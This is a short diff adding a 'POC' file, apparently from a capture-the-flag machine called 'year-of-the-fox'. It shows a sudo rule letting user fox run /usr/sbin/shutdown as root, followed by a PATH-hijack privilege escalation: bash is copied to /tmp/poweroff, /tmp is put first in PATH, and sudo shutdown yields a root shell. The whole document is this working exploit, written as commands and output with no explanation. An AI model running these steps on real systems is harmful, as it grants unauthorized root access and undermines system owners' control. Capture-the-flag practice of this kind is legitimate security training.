@@ -1,0 +1,12 @@
+POC
+
+User fox may run the following commands on year-of-the-fox:
+    (root) NOPASSWD: /usr/sbin/shutdown
+
+
+fox@year-of-the-fox:/usr/sbin$ cd /tmp/
+fox@year-of-the-fox:/tmp$ cp /bin/bash /tmp/poweroff
+fox@year-of-the-fox:/tmp$ chmod +x /tmp/poweroff 
+fox@year-of-the-fox:/tmp$ export PATH=/tmp:$PATH
+fox@year-of-the-fox:/tmp$ sudo /usr/sbin/shutdown 
+root@year-of-the-fox:/tmp# 
